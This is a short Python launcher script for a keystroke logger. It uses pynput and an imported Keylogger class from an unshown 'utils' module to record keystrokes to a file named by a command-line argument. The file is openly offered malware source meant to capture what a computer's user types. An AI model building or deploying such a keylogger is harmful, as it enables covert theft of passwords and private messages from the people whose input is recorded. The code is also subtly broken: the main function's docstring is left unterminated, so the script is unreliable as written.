import argparse
import logging
from pynput import keyboard
from utils import setup_logging, Keylogger

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Simple Keylogger")
    parser.add_argument('--output', type=str, default='keylog.txt', help='Output file for keystrokes')
    return parser.parse_args()

def main():
    """Main function to run the keylogger."
    args = parse_arguments()
    setup_logging()
    logger = logging.getLogger(__name__)

    try:
        keylogger = Keylogger(output_file=args.output)
        keylogger.start()
        logger.info(f"Keylogger started. Logging to {args.output}")
    except Exception as e:
        logger.error(f"An error occurred: {e}")

if __name__ == "__main__":
    main()